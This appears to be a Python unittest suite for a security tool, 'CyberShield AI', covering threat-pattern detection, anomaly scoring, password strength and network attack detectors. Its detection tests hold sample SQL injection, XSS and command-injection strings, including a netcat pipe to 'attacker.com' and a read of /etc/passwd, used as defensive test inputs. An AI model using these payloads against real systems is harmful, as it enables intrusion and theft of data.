"""
CyberShield AI - Comprehensive Testing Suite
Unit tests, integration tests, and security scenario testing
"""

import unittest
from datetime import datetime, timedelta
from cyber_shield import (
    CyberShield, ThreatLevel, SecurityEvent, ThreatDatabase,
    AnomalyDetector, IntrusionDetectionSystem, PasswordAnalyzer
)
from network_monitor import (
    NetworkSecurityMonitor, NetworkPacket, DDoSDetector,
    PortScanDetector, BruteForceDetector
)


class TestThreatDatabase(unittest.TestCase):
    """Test threat signature detection"""
    
    def setUp(self):
        self.db = ThreatDatabase()
    
    def test_sql_injection_detection(self):
        """Test SQL injection pattern detection"""
        payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "1' UNION SELECT * FROM passwords--",
        ]
        
        for payload in payloads:
            self.assertTrue(
                self.db.is_malicious_pattern(payload),
                f"Failed to detect: {payload}"
            )
    
    def test_xss_detection(self):
        """Test XSS pattern detection"""
        payloads = [
            "<script>alert('xss')</script>",
            "javascript:void(0)",
            "<img src=x onerror=alert('xss')>",
        ]
        
        for payload in payloads:
            self.assertTrue(
                self.db.is_malicious_pattern(payload),
                f"Failed to detect: {payload}"
            )
    
    def test_command_injection_detection(self):
        """Test command injection detection"""
        payloads = [
            "; cat /etc/passwd",
            "| nc attacker.com 4444",
            "` whoami `",
        ]
        
        for payload in payloads:
            self.assertTrue(
                self.db.is_malicious_pattern(payload),
                f"Failed to detect: {payload}"
            )
    
    def test_benign_traffic(self):
        """Test normal traffic passes through"""
        payloads = [
            "GET / HTTP/1.1",
            "normal user input",
            "select name from users",
        ]
        
        for payload in payloads:
            self.assertFalse(
                self.db.is_malicious_pattern(payload),
                f"False positive: {payload}"
            )


class TestAnomalyDetector(unittest.TestCase):
    """Test ML-based anomaly detection"""
    
    def setUp(self):
        self.detector = AnomalyDetector()
        self.detector.is_trained = True  # Skip training for tests
    
    def test_anomaly_scoring(self):
        """Test anomaly score calculation"""
        normal_event = {
            'protocol': 6,
            'src_bytes': 1024,
            'dst_bytes': 2048,
            'duration': 120,
            'payload_size': 256,
            'flag_count': 2,
            'port': 443,
            'src_port': 54321,
            'dst_port': 443,
            'urgent': 0,
            'service_code': 1,
            'direction': 1,
        }
        
        anomaly, score = self.detector.detect_anomaly(normal_event)
        self.assertIsInstance(anomaly, bool)
        self.assertGreaterEqual(score, 0)
        self.assertLessEqual(score, 1)
    
    def test_high_traffic_anomaly(self):
        """Test detection of unusual traffic patterns"""
        suspicious_event = {
            'protocol': 6,
            'src_bytes': 1000000,  # Unusually large
            'dst_bytes': 100,
            'duration': 1,  # Very quick
            'payload_size': 65536,
            'flag_count': 32,
            'port': 22,
            'src_port': 12345,
            'dst_port': 22,
            'urgent': 1,
            'service_code': 2,
            'direction': 0,
        }
        
        anomaly, score = self.detector.detect_anomaly(suspicious_event)
        # Higher score expected for suspicious traffic
        self.assertGreater(score, 0.3)


class TestPasswordAnalyzer(unittest.TestCase):
    """Test password strength analysis"""
    
    def setUp(self):
        self.analyzer = PasswordAnalyzer()
    
    def test_weak_passwords(self):
        """Test detection of weak passwords"""
        weak_passwords = [
            "password",
            "123456",
            "qwerty",
            "admin",
            "letmein",
        ]
        
        for pwd in weak_passwords:
            result = self.analyzer.analyze_password(pwd)
            self.assertLess(
                result['score'], 4,
                f"Should be weak: {pwd}"
            )
    
    def test_strong_passwords(self):
        """Test detection of strong passwords"""
        strong_passwords = [
            "Tr0p1c@l.P@ssw0rd!2024",
            "C0mpl3x#M@st3rp@ss",
            "N3wY0rk£Sk7line!@#",
        ]
        
        for pwd in strong_passwords:
            result = self.analyzer.analyze_password(pwd)
            self.assertGreaterEqual(
                result['score'], 4,
                f"Should be strong: {pwd}"
            )
    
    def test_entropy_calculation(self):
        """Test password entropy calculation"""
        result = self.analyzer.analyze_password("MyPassword123!")
        self.assertGreater(result['entropy'], 30)  # Should have decent entropy
    
    def test_dictionary_detection(self):
        """Test common password detection"""
        result = self.analyzer.analyze_password("password123")
        self.assertIn("dictionary", result['strength'].lower())


class TestIntrusionDetectionSystem(unittest.TestCase):
    """Test IDS classification"""
    
    def setUp(self):
        self.ids = IntrusionDetectionSystem()
        self.ids.is_trained = True
    
    def test_normal_traffic_classification(self):
        """Test normal traffic classification"""
        normal_event = [6, 1024, 2048, 120, 256, 2, 443, 54321, 443, 0, 1]
        
        prediction, confidence = self.ids.classify_traffic(normal_event)
        self.assertIn(prediction, [0, 1])  # 0=normal, 1=attack
        self.assertGreaterEqual(confidence, 0)
        self.assertLessEqual(confidence, 1)
    
    def test_attack_classification(self):
        """Test attack traffic classification"""
        attack_event = [6, 1000000, 100, 1, 65536, 32, 22, 12345, 22, 1, 2]
        
        prediction, confidence = self.ids.classify_traffic(attack_event)
        # Expect higher confidence for suspicious patterns
        self.assertGreaterEqual(confidence, 0)


class TestNetworkMonitoring(unittest.TestCase):
    """Test network security monitoring"""
    
    def setUp(self):
        self.monitor = NetworkSecurityMonitor()
    
    def test_ddos_detection(self):
        """Test DDoS attack detection"""
        detector = DDoSDetector()
        
        # Simulate normal traffic
        for i in range(100):
            packet = NetworkPacket(
                timestamp=datetime.now().timestamp(),
                source_ip='192.168.1.100',
                dest_ip='8.8.8.8',
                source_port=50000 + i,
                dest_port=53,
                protocol='UDP',
                size=128,
                flags=0
            )
            detector.analyze_packet(packet)
        
        # Should not trigger alarm
        status = detector.get_status()
        self.assertFalse(status['is_attacking'])
    
    def test_port_scan_detection(self):
        """Test port scanning detection"""
        detector = PortScanDetector()
        
        # Simulate port scanning
        for port in range(1000, 1010):
            packet = NetworkPacket(
                timestamp=datetime.now().timestamp(),
                source_ip='203.0.113.45',
                dest_ip='10.0.0.1',
                source_port=54321,
                dest_port=port,
                protocol='TCP',
                size=64,
                flags=2  # SYN flag
            )
            detected = detector.analyze_packet(packet)
            if port >= 1005:  # Should detect after 5+ ports
                self.assertTrue(detected)
    
    def test_brute_force_detection(self):
        """Test brute force attack detection"""
        detector = BruteForceDetector()
        
        # Simulate failed login attempts
        now = datetime.now()
        for i in range(6):
            packet = NetworkPacket(
                timestamp=(now - timedelta(seconds=30*(5-i))).timestamp(),
                source_ip='203.0.113.45',
                dest_ip='10.0.0.1',
                source_port=54321 + i,
                dest_port=22,
                protocol='TCP',
                size=150,
                flags=16  # RST flag (connection reset = failure)
            )
            detected = detector.analyze_packet(packet)
        
        # Should detect brute force after multiple failures
        status = detector.get_status()
        self.assertEqual(len(status['failed_attempts']['10.0.0.1']), 1)


class TestCyberShield(unittest.TestCase):
    """Test main CyberShield system"""
    
    def setUp(self):
        self.shield = CyberShield("TestShield")
    
    def test_shield_initialization(self):
        """Test shield initializes correctly"""
        self.assertIsNotNone(self.shield.threat_db)
        self.assertIsNotNone(self.shield.anomaly_detector)
        self.assertIsNotNone(self.shield.ids)
        self.assertIsNotNone(self.shield.password_analyzer)
    
    def test_security_event_analysis(self):
        """Test security event analysis"""
        event = {
            'source_ip': '192.168.1.100',
            'destination_ip': '8.8.8.8',
            'port': 443,
            'payload': 'GET / HTTP/1.1',
            'protocol': 'TCP',
            'payload_size': 256,
            'flag_count': 2,
            'duration': 120,
            'src_bytes': 1024,
            'dst_bytes': 2048,
        }
        
        result = self.shield.analyze_security_event(event)
        self.assertIn('threat_level', result)
        self.assertIn('threat_score', result)
        self.assertIn(result['threat_level'], [tl.name for tl in ThreatLevel])
    
    def test_malicious_payload_detection(self):
        """Test detection of malicious payloads"""
        event = {
            'source_ip': '203.0.113.45',
            'destination_ip': '10.0.0.1',
            'port': 443,
            'payload': "' OR '1'='1",  # SQL injection
            'protocol': 'TCP',
            'payload_size': 256,
            'flag_count': 2,
            'duration': 120,
            'src_bytes': 1024,
            'dst_bytes': 2048,
        }
        
        result = self.shield.analyze_security_event(event)
        # Should detect higher threat
        self.assertGreater(result['threat_score'], 30)
    
    def test_security_status(self):
        """Test security status reporting"""
        status = self.shield.get_security_status()
        self.assertIn('shield_name', status)
        self.assertIn('status', status)
        self.assertIn('health', status)
        self.assertIn('statistics', status)
    
    def test_report_generation(self):
        """Test security report generation"""
        report = self.shield.generate_security_report()
        self.assertIsInstance(report, str)
        self.assertIn('Shield Health', report)
        self.assertIn('Threat Statistics', report)


class SecurityScenarioTests(unittest.TestCase):
    """Test realistic security scenarios"""
    
    def setUp(self):
        self.shield = CyberShield("ScenarioTest")
    
    def test_scenario_sql_injection_attack(self):
        """Scenario: SQL injection attack"""
        event = {
            'source_ip': '203.0.113.100',
            'destination_ip': '10.0.0.50',
            'port': 3306,
            'payload': "admin'; DROP TABLE users; --",
            'protocol': 'TCP',
            'payload_size': 256,
            'flag_count': 2,
            'duration': 2,
            'src_bytes': 512,
            'dst_bytes': 256,
        }
        
        result = self.shield.analyze_security_event(event)
        self.assertIn(result['threat_level'].name, ['HIGH', 'CRITICAL'])
    
    def test_scenario_ddos_attack(self):
        """Scenario: DDoS attack"""
        monitor = NetworkSecurityMonitor()
        
        # Simulate flood attack
        for i in range(2000):
            packet = NetworkPacket(
                timestamp=datetime.now().timestamp(),
                source_ip='203.0.113.200',
                dest_ip='10.0.0.1',
                source_port=50000 + (i % 1000),
                dest_port=80,
                protocol='UDP',
                size=64,
                flags=0
            )
            monitor.analyze_packet(packet)
    
    def test_scenario_password_attack(self):
        """Scenario: Password policy violation"""
        passwords = [
            "admin",          # Too simple
            "password123",    # Dictionary word
            "123456789",      # Only numbers
            "aaaaaaaaaaaa",   # Only letters
        ]
        
        analyzer = PasswordAnalyzer()
        for pwd in passwords:
            result = analyzer.analyze_password(pwd)
            self.assertLess(result['score'], 3, f"Should reject: {pwd}")


# Performance tests
class PerformanceTests(unittest.TestCase):
    """Test system performance"""
    
    def test_event_processing_speed(self):
        """Test throughput of event processing"""
        import time
        
        shield = CyberShield("PerfTest")
        event = {
            'source_ip': '192.168.1.100',
            'destination_ip': '8.8.8.8',
            'port': 443,
            'payload': 'test',
            'protocol': 'TCP',
            'payload_size': 256,
            'flag_count': 2,
            'duration': 120,
            'src_bytes': 1024,
            'dst_bytes': 2048,
        }
        
        start = time.time()
        for _ in range(100):
            shield.analyze_security_event(event)
        elapsed = time.time() - start
        
        # Should process 100 events in reasonable time
        self.assertLess(elapsed, 5.0, f"Too slow: {elapsed}s for 100 events")
    
    def test_memory_efficiency(self):
        """Test memory usage with large event logs"""
        import sys
        
        shield = CyberShield("MemTest")
        initial_size = sys.getsizeof(shield)
        
        # Process 1000 events
        for i in range(1000):
            shield.analyze_security_event({
                'source_ip': f'192.168.1.{i % 256}',
                'destination_ip': '8.8.8.8',
                'port': 443 + (i % 1000),
                'payload': 'test' * (i % 10),
                'protocol': 'TCP',
                'payload_size': 256,
                'flag_count': 2,
                'duration': 120,
                'src_bytes': 1024,
                'dst_bytes': 2048,
            })
        
        final_size = sys.getsizeof(shield)
        growth = final_size - initial_size
        
        # Memory growth should be reasonable
        self.assertLess(growth, 100000000, "Memory usage grew too much")


def run_all_tests():
    """Run all test suites"""
    # Create test suite
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()
    
    # Add all test classes
    suite.addTests(loader.loadTestsFromTestCase(TestThreatDatabase))
    suite.addTests(loader.loadTestsFromTestCase(TestAnomalyDetector))
    suite.addTests(loader.loadTestsFromTestCase(TestPasswordAnalyzer))
    suite.addTests(loader.loadTestsFromTestCase(TestIntrusionDetectionSystem))
    suite.addTests(loader.loadTestsFromTestCase(TestNetworkMonitoring))
    suite.addTests(loader.loadTestsFromTestCase(TestCyberShield))
    suite.addTests(loader.loadTestsFromTestCase(SecurityScenarioTests))
    suite.addTests(loader.loadTestsFromTestCase(PerformanceTests))
    
    # Run tests
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    
    # Print summary
    print(f"\n{'='*60}")
    print(f"Tests Run: {result.testsRun}")
    print(f"Successes: {result.testsRun - len(result.failures) - len(result.errors)}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    print(f"{'='*60}\n")
    
    return result.wasSuccessful()


if __name__ == '__main__':
    success = run_all_tests()
    exit(0 if success else 1)
